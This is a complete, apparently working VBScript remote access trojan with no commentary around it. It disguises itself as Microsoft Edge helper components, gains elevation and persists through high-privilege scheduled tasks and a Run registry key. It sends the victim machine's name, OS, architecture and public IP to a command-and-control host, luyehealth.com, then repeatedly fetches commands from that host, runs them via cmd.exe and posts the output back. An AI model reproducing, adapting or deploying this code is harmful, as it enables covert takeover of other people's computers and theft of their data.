Option Explicit

Dim gHost, gKey, gWait, gTask1, gTask2, gFile

gHost = "luyehealth.com"
gKey = "RAT2025_SECURE_TOKEN_FIXED_2025"
gWait = 10000
gTask1 = "EdgeBrowserHelper"
gTask2 = "EdgeBrowserSync"
gFile = "edgebrowserhelper.vbs"

Dim gShell, gFSO, gNet
Set gShell = CreateObject("WScript.Shell")
Set gFSO = CreateObject("Scripting.FileSystemObject")
Set gNet = CreateObject("WScript.Network")

Function GetFolder()
    GetFolder = gShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\EdgeUpdate\"
End Function

Function GetPath()
    GetPath = GetFolder() & gFile
End Function

Sub MakeFolder(p)
    On Error Resume Next
    If Not gFSO.FolderExists(p) Then
        gFSO.CreateFolder p
    End If
    Err.Clear
End Sub

Sub CopyMe()
    On Error Resume Next
    Dim s, d, pf
    s = WScript.ScriptFullName
    d = GetPath()
    pf = gFSO.GetParentFolderName(d)
    MakeFolder gFSO.GetParentFolderName(pf)
    MakeFolder pf
    If gFSO.FileExists(s) And LCase(s) <> LCase(d) Then
        gFSO.CopyFile s, d, True
    End If
    Err.Clear
End Sub

Sub Elevate()
    Dim a
    Set a = CreateObject("Shell.Application")
    a.ShellExecute "wscript.exe", "//B """ & WScript.ScriptFullName & """ setup", "", "runas", 0
    WScript.Quit
End Sub

Function TaskOK()
    On Error Resume Next
    Dim e, o, c
    Set e = gShell.Exec("schtasks /query /tn """ & gTask1 & """ 2>&1")
    Do While e.Status = 0
        WScript.Sleep 100
    Loop
    o = e.StdOut.ReadAll
    c = e.ExitCode
    TaskOK = (c = 0 And InStr(o, gTask1) > 0)
    Err.Clear
End Function

Sub MakeTasks()
    Dim p, cmd1, cmd2
    CopyMe
    p = GetPath()
    cmd1 = "schtasks /create /tn """ & gTask1 & """ /tr ""wscript.exe //B \""" & p & "\"" run"" /sc onlogon /rl highest /f"
    gShell.Run cmd1, 0, True
    cmd2 = "schtasks /create /tn """ & gTask2 & """ /tr ""wscript.exe //B \""" & p & "\"" chk"" /sc minute /mo 3 /rl highest /f"
    gShell.Run cmd2, 0, True
    gShell.Run "schtasks /run /tn """ & gTask1 & """", 0, False
End Sub

Function Running()
    On Error Resume Next
    Dim w, ps, pr, cnt, cl
    Set w = GetObject("winmgmts:\\.\root\cimv2")
    Set ps = w.ExecQuery("SELECT CommandLine FROM Win32_Process WHERE Name='wscript.exe'")
    cnt = 0
    For Each pr In ps
        cl = LCase(pr.CommandLine & "")
        If InStr(cl, LCase(gFile)) > 0 And InStr(cl, "run") > 0 Then
            cnt = cnt + 1
        End If
    Next
    Running = (cnt > 0)
    Err.Clear
End Function

Sub ChkProc()
    On Error Resume Next
    FixReg
    If Not Running() Then
        gShell.Run "schtasks /run /tn """ & gTask1 & """", 0, False
    End If
    WScript.Quit
End Sub

Sub FixReg()
    On Error Resume Next
    Dim rk
    CopyMe
    rk = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\EdgeUpdater"
    gShell.RegWrite rk, "schtasks /run /tn """ & gTask1 & """", "REG_SZ"
    Err.Clear
    If Not TaskOK() Then
        Dim cmd1
        cmd1 = "schtasks /create /tn """ & gTask1 & """ /tr ""wscript.exe //B \""" & GetPath() & "\"" run"" /sc onlogon /rl highest /f"
        gShell.Run cmd1, 0, True
    End If
    Err.Clear
End Sub

Dim args
Set args = WScript.Arguments

If args.Count > 0 Then
    Select Case args(0)
        Case "run"
            FixReg
        Case "setup"
            MakeTasks
            WScript.Quit
        Case "chk"
            ChkProc
    End Select
Else
    If TaskOK() Then
        gShell.Run "schtasks /run /tn """ & gTask1 & """", 0, False
        WScript.Quit
    Else
        Elevate
    End If
End If

On Error Resume Next

Function GetPC()
    GetPC = gNet.ComputerName
End Function

Function GetID()
    Dim n, h, i
    n = GetPC()
    h = 0
    For i = 1 To Len(n)
        h = (h * 31 + Asc(Mid(n, i, 1))) Mod 100000
    Next
    GetID = "VBS" & n & h
End Function

Function GetArch()
    Dim a
    a = gShell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%")
    If InStr(a, "64") > 0 Then
        GetArch = "64bit"
    Else
        GetArch = "32bit"
    End If
End Function

Function GetOS()
    On Error Resume Next
    Dim w, os, o
    Set w = GetObject("winmgmts:\\.\root\cimv2")
    Set os = w.ExecQuery("SELECT Caption FROM Win32_OperatingSystem")
    For Each o In os
        GetOS = o.Caption
        Exit For
    Next
    If GetOS = "" Then GetOS = "Windows"
End Function

Function GetIP()
    On Error Resume Next
    Dim h
    GetIP = "unknown"
    Set h = CreateObject("WinHttp.WinHttpRequest.5.1")
    h.Open "GET", "https://api.ipify.org", False
    h.Send
    If Err.Number = 0 And h.Status = 200 Then
        GetIP = Trim(h.ResponseText)
    End If
    Set h = Nothing
    Err.Clear
End Function

Function Web(m, ep, d, au)
    On Error Resume Next
    Dim h, u
    u = "https://" & gHost & ep
    Set h = CreateObject("WinHttp.WinHttpRequest.5.1")
    h.Open m, u, False
    h.SetRequestHeader "Content-Type", "application/json"
    If au <> "" Then
        h.SetRequestHeader "Authorization", au
    End If
    h.Send d
    If Err.Number = 0 Then
        Web = h.ResponseText
    Else
        Web = ""
        Err.Clear
    End If
    Set h = Nothing
End Function

Function Cmd(c)
    On Error Resume Next
    Dim e, o, ln
    Set e = gShell.Exec("cmd.exe /c " & c)
    o = ""
    Do While Not e.StdOut.AtEndOfStream
        ln = e.StdOut.ReadLine()
        o = o & ln & vbCrLf
    Loop
    Do While Not e.StdErr.AtEndOfStream
        ln = e.StdErr.ReadLine()
        o = o & ln & vbCrLf
    Loop
    Cmd = o
End Function

Function Esc(s)
    Dim r, i, c
    r = ""
    For i = 1 To Len(s)
        c = Mid(s, i, 1)
        Select Case c
            Case """": r = r & "\"""
            Case "\": r = r & "\\"
            Case vbCr: r = r & "\r"
            Case vbLf: r = r & "\n"
            Case vbTab: r = r & "\t"
            Case Else
                If Asc(c) >= 32 And Asc(c) < 127 Then r = r & c
        End Select
    Next
    Esc = r
End Function

Function UnEsc(s)
    Dim r, i, c, nx
    r = ""
    i = 1
    Do While i <= Len(s)
        c = Mid(s, i, 1)
        If c = "\" And i < Len(s) Then
            nx = Mid(s, i + 1, 1)
            Select Case nx
                Case "\": r = r & "\": i = i + 1
                Case """": r = r & """": i = i + 1
                Case "n": r = r & vbLf: i = i + 1
                Case "r": r = r & vbCr: i = i + 1
                Case "t": r = r & vbTab: i = i + 1
                Case Else: r = r & c
            End Select
        Else
            r = r & c
        End If
        i = i + 1
    Loop
    UnEsc = r
End Function

Function Val2(js, ky)
    Dim sk, po, sp, ep, vl
    sk = """" & ky & """"
    po = InStr(js, sk)
    If po = 0 Then Val2 = "": Exit Function
    po = InStr(po, js, ":")
    If po = 0 Then Val2 = "": Exit Function
    po = po + 1
    Do While Mid(js, po, 1) = " ": po = po + 1: Loop
    If Mid(js, po, 1) = """" Then
        sp = po + 1: ep = sp
        Do While ep <= Len(js)
            If Mid(js, ep, 1) = "\" Then
                ep = ep + 2
            ElseIf Mid(js, ep, 1) = """" Then
                Exit Do
            Else
                ep = ep + 1
            End If
        Loop
        vl = Mid(js, sp, ep - sp)
        vl = UnEsc(vl)
    Else
        sp = po
        ep = InStr(sp, js, ",")
        If ep = 0 Then ep = InStr(sp, js, "}")
        vl = Trim(Mid(js, sp, ep - sp))
    End If
    Val2 = vl
End Function

Sub Reg(id)
    On Error Resume Next
    Dim j
    j = "{""client_id"":""" & id & """,""hostname"":""" & GetPC() & """,""platform"":""Windows"",""platform_release"":""" & GetOS() & """,""architecture"":""" & GetArch() & """,""ip_address"":""" & GetIP() & """,""auth_token"":""" & gKey & """}"
    Web "POST", "/api/poll/register", j, ""
    Err.Clear
End Sub

Sub Res(id, cid, rs)
    Dim j
    j = "{""client_id"":""" & id & """,""command_id"":""" & cid & """,""result"":""" & Esc(rs) & """,""error"":"""",""exit_code"":0}"
    Web "POST", "/api/poll/result", j, gKey
End Sub

Sub Go()
    On Error Resume Next
    Dim id, rp, sd, cms, cs, ce, cj, cid, cm, rs, emp, lr
    
    id = GetID()
    emp = 0
    lr = Now
    
    FixReg
    Err.Clear
    
    WScript.Sleep 2000
    Reg id
    Err.Clear
    
    Do While True
        Err.Clear
        rp = Web("GET", "/api/poll/commands/" & id, "", gKey)
        
        If rp = "" Or InStr(rp, "not found") > 0 Or InStr(rp, "error") > 0 Then
            emp = emp + 1
            If emp >= 3 Or DateDiff("n", lr, Now) >= 5 Then
                Reg id
                emp = 0
                lr = Now
            End If
        Else
            emp = 0
        End If
        
        If rp <> "" Then
            sd = Val2(rp, "shutdown")
            If sd = "true" Then WScript.Quit
            
            cs = InStr(rp, "[")
            ce = InStrRev(rp, "]")
            If cs > 0 And ce > cs Then
                cms = Mid(rp, cs + 1, ce - cs - 1)
                Do While InStr(cms, "{") > 0
                    cs = InStr(cms, "{")
                    ce = InStr(cms, "}")
                    If cs > 0 And ce > cs Then
                        cj = Mid(cms, cs, ce - cs + 1)
                        cid = Val2(cj, "command_id")
                        cm = Val2(cj, "command")
                        If cid <> "" And cm <> "" Then
                            Dim dl
                            dl = Val2(cj, "delay")
                            If dl <> "" And IsNumeric(dl) Then
                                If CInt(dl) > 0 Then WScript.Sleep CInt(dl) * 1000
                            End If
                            rs = Cmd(cm)
                            Res id, cid, rs
                        End If
                        cms = Mid(cms, ce + 1)
                    Else
                        Exit Do
                    End If
                Loop
            End If
        End If
        
        WScript.Sleep gWait
    Loop
End Sub

Go
